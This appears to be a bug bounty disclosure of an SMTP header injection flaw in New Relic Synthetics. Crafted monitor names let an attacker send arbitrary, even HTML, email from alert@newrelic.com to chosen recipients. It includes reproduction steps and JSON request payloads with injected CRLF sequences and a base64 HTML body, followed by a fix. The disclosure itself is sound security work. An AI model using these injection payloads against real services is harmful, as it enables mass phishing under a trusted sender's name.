title: [synthetics.newrelic.com] SMTP header injection leads to (mass) arbitrary email sending
vulnerability_information:
While setting up a Synthetics "Ping", I noticed that the name of your `monitor` was echoed back in warning emails about hosts that fail the validation string phase. I abused this mechanism to insert newline mechanism in these emails, allowing the sending of near arbitrary emails to a easily controllable list of recipients. Since attackers can insert what seem to be an infinite amount of email recipients, this can be abused to perform massive phishing campaigns, where the attacker controls both the 100% of the email content, 100% of the recipients, and most of the "Subject" field.

# Steps to reproduce
1. Login to a Newrelic account
1. Visit the synthetics monitors page (https://synthetics.newrelic.com/)
1. Press the `Create new monitor` button
1. In the `monitor name` field, insert anything
1. In the `URL` field, insert any valid and available URL
1. in the `validation string` field, insert any string that *is not* part of the DOM for the URL specified in step #5 (ex: `FOOBAR` on `perdu.com`)
1. Select a location, I picked Montreal for my tests
1. In the `Get notified`, insert a valid email address
1. Press the `Create my monitor` button and intercept this HTTP request and apply the following changes:

```json
{
  "accountId": {_ID_},
  "name": "Foobar\r\n\r\nArbitrary email content\r\n", -> Change this field
  "type": "SIMPLE",
  "frequency": 10,
  "uri": "http://perdu.com",
  "status": "ENABLED",
  "locations": [
    "AWS_CA_CENTRAL_1"
  ],
  "metadata": {
    "nr.synthetics.metadata.job.options.response-validation": "FOOBAR",
    "nr.synthetics.metadata.job.options.simple.bypass.head": "true"
  },
  "conditions": [],
  "emails": [
    "some@email.com", -> you can add more emails here
    "some.other@email.com",
    "yet.another@email.com"
  ]
}
```
Once the modifications are done, send the requests. The synthetics system will fetch the web content content and the validation will fail. When this happens, emails will be sent to every recipients of the `emails` JSON list and they will receive the following emails: (excerpt from the SMTP headers)

```http
From: New Relic Alert <alert@newrelic.com>
To: █████@gmail.com, deliverytemp@gmail.com, ███████@gmail.com
Message-ID: {…}
Subject: Monitor Failed - Foobar

Arbitrary email content
…
```

The exploit chain can be observed in the following GIF: {F293730}

## Bypassing character line limitation and character blacklisting for more realistic phishing
By default, lines are truncated after enough spaces, breaking the style of the emails; It was near impossible to make near sentences without them being filled with carriage return characters which would break the sentence. Not much phishing can go on this way. However, I found it is possible to add the following headers in order to provide a base64 encoded email:

```http
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: base64
```
This bypasses this breakage, but *also* allows us to send HTML in our emails! The Synthetics system strips HTML tags from monitor names, so using these headers, we can fully bypass this restriction. Here is a proof of concept leveraging these headers:

```json
{
  "accountId": 1968666,
  "name": "Phishing\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\nPGgxPkhleSB0aGVyZSEgVGhpcyBlbWFpbHMgY29udGFpbnMgPGk+SFRNTDwvaT4gbm93ITwvaDE+PCEtLQ==",
  "type": "SIMPLE",
  "frequency": 10,
  "uri": "http://perdu.com",
  "status": "ENABLED",
  "locations": [
    "AWS_CA_CENTRAL_1"
  ],
  "metadata": {
    "nr.synthetics.metadata.job.options.response-validation": "NOT_THERE",
    "nr.synthetics.metadata.job.options.simple.bypass.head": "true"
  },
  "conditions": [],
  "emails": [
    "deliverytemp@gmail.com"
  ]
}
```
This will send emails with a `Phishing` subject, insert the two aforementionned headers, and the base64 payload which contains HTML. Here is the resulting email: {F293750}


## Resolution
Neutralize carriage-return/line-feed characters in the `monitor name` field. These characters should not be trusted in SMTP headers.

## Impact

This feature can be leveraged to perform large-scall phishing operations. Malicious users can use this flaw in order to send arbitrary emails to large amounts of recipients, all coming from a valid, signed email from `alert@newrelic.com`.
